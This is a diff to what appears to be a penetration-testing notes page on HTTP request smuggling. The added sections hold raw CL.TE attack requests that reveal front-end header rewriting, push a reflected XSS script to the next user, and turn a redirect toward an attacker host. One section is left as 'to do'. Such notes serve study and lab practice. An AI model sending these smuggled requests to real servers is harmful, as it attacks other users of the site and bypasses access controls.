@@ -50,7 +50,7 @@ q=smuggling
 ## <mark style="color:yellow;">Identification</mark>
 
 {% hint style="warning" %}
-**Important**: use HTTP/1.1 protocol, not HTTP/2
+**Important**: use HTTP/1.1 protocol, not HTTP/2. In burp change it using Inspector.
 {% endhint %}
 
 ### <mark style="color:yellow;">**CL.TE**</mark>
@@ -162,7 +162,7 @@ x=
 \r\n
 ```
 
-`7c` -> all chars from `GET` until `x=`
+`7b` -> all chars from `GET` until `x=`
 
 `Content-Legth: 4` -> `7` `c` `\r` `\n`
 
@@ -201,3 +201,109 @@ Host: vulnerable-website.com
 
 * The front-end server sees two requests here, both for `/home`, and so the requests are forwarded to the back-end server.&#x20;
 * The back-end server sees requests for `/home` and `/admin`, assumes they've passed front-end controls, and grants access to the restricted URL.
+
+### <mark style="color:yellow;">Revealing front-end request rewriting</mark> <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>
+
+Find a request that reflects the value
+
+```http
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+
+email=user@normal-user.net
+```
+
+```html
+<input id="email" value="user@normal-user.net" type="text">
+```
+
+Use the following request smuggling attack to reveal the rewriting
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+email=POST /login HTTP/1.1
+Host: vulnerable-website.com
+...
+```
+
+```html
+<input id="email" value="POST /login HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For: 1.3.3.7
+X-Forwarded-Proto: https
+X-TLS-Bits: 128
+X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
+X-TLS-Version: TLSv1.2
+x-nr-external-service: external
+...
+```
+
+### <mark style="color:yellow;">Capturing other users' requests</mark> <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>
+
+to do
+
+### <mark style="color:yellow;">Using HTTP request smuggling to exploit reflected XSS</mark>
+
+You can use a request smuggling attack to target other users of the application. This method is better than standard reflected XSS because it doesn't require victim interaction and can exploit XSS in areas like HTTP headers, which are not possible to control in typical attacks.
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
+
+The next user's request is appended to the smuggled one, delivering the XSS payload in their response.
+
+### <mark style="color:yellow;">Turn an on-site redirect into an open redirect</mark> <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>
+
+```http
+GET /home HTTP/1.1
+Host: normal-website.com
+
+HTTP/1.1 301 Moved Permanently
+Location: https://normal-website.com/home/
+```
+
+Exploit
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /home HTTP/1.1
+Host: attacker-website.com
+Foo: X
+
+```
+
+## <mark style="color:yellow;">Content-Length in the smuggled request</mark>
+
+The value in the `Content-Length` header in the smuggled request will determine how long the back-end server believes the request is. If you set this value too short, you will receive only part of the rewritten request; if you set it too long, the back-end server will time out waiting for the request to complete. Of course, the solution is to guess an initial value that is a bit bigger than the submitted request, and then gradually increase the value to retrieve more information, until you have everything of interest.
